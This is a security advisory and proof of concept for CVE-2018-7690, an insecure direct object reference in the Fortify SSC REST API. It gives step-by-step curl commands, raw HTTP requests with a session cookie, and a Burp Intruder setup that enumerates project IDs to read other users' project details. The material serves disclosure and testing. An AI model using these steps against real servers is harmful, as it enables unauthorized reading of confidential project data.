Software: Fortify SSC (Software Security Center)
Version: 17.10, 17.20 & 18.10
Homepage: https://www.microfocus.com
Advisory report: https://github.com/alt3kx/CVE-2018-7690
CVE: CVE-2018-7690
CVSS: 6.5 (Medium; AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
CWE-639

Description
================
Fortify SSC (Software Security Center) REST-API contain Insecure direct object references (IDOR) allowing reading arbitrary details of other user's
Fortify projects via GET method

Vulnerability
================
Fortify SSC (Software Security Center) 7.10, does not properly check ownership of projects, which allows remote authenticated (view-only) users
to read arbitrary details via API projects ID parameter to /api/v1/projects/{NUMBER}

Note: View-only Role, is a restricted role, can view results, but cannot interfere with the issue triage or the remediation process.

Proof of concept
================

Pre-requisites:

- curl command deployed (Windows or Linux)
- jq command deployed (for parsing JSON fields), (Windows or Linux)
- Burpsuite Free/Pro deployed or any other Proxy to catch/send the request (optional)

Step (1): LogOn into fortifyserver.com SSC (Software Security Center) 17.10 with your view-only role (restricted),

The URL normally is avaiable as following:

Target: https://fortifyserver.com/ssc/#/

Step (2): Once logged extract the Cookie field, the formmat normallly as following: "Cookie: JSESSIONID=A98ACC5DA0FB519210D9C198D2F4E3FF;"
Step (3): Start BurpSuite Free/Pro or any other HTTP proxy (optional) listen port 8080 as default

Step (4): The offending GET is:

GET /ssc/api/v1/projects/2 HTTP/1.1
Host: fortifyserver.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=A98ACC5DA0FB519210D9C198D2F4E3FF;

Step (5): Test the first GET (to be included the cookie session) request and parsing the JSON data received using curl and jq commands as following:

# curl -s -k -X GET https://fortifyserver.com/ssc/api/v1/projects/2

-H "Host: fortifyserver.com"
-H "Connection: close"
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36"
-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
-H "Accept-Encoding: gzip, deflate"
-H "Accept-Language: en-US,en;q=0.9"
-H "Cookie: JSESSIONID=A98ACC5DA0FB519210D9C198D2F4E3FF;"
-b "JSESSIONID=A98ACC5DA0FB519210D9C198D2F4E3FF"
--proxy http://127.0.0.1:8080 | jq '.data'

You should see the following response project details:

{
  "createdBy": "admin",
  "name": "Project Name Here",
  "description": "",
  "id": 2,
  "creationDate": "2012-08-03T09:43:36.000+0000",
  "issueTemplateId": null
}

Step (6): Now extract all the projects details registered into Fortify SSC server:

Payload:  https://fortifyserver.com/ssc/api/v1/projects/{NUMBER} , and change the number as following:

# curl -s -k -X GET https://fortifyserver.com/ssc/api/v1/projects/5

-H "Host: fortifyserver.com"
-H "Connection: close"
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36"
-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
-H "Accept-Encoding: gzip, deflate"
-H "Accept-Language: en-US,en;q=0.9"
-H "Cookie: JSESSIONID=A98ACC5DA0FB519210D9C198D2F4E3FF;"
-b "JSESSIONID=A98ACC5DA0FB519210D9C198D2F4E3FF"
--proxy http://127.0.0.1:8080 | jq '.data'

You should see other project details available as following:

{
"createdBy": "alex",
"name": "Project Name Here",
"description": "",
"id": 5,
"creationDate": "2012-09-21T09:35:16.000+0000",
"issueTemplateId": null
}

Step (7): Automate with BurpSuite Pro/Free choose:

Payload Positions: "Intruder Tab -> Positions" highlight as following:

-> /ssc/api/v1/projects/ยง1ยง

Payloads set: "Intruder Tab -> Payloads" with the following data:

-> Payload set: 1

-> Payload type: Numbers

Payload Options [Numbers]:

-> Type: Sequential

-> From: 0

-> To: 1500

-> Step: 1

Then start attack...

Have fun!
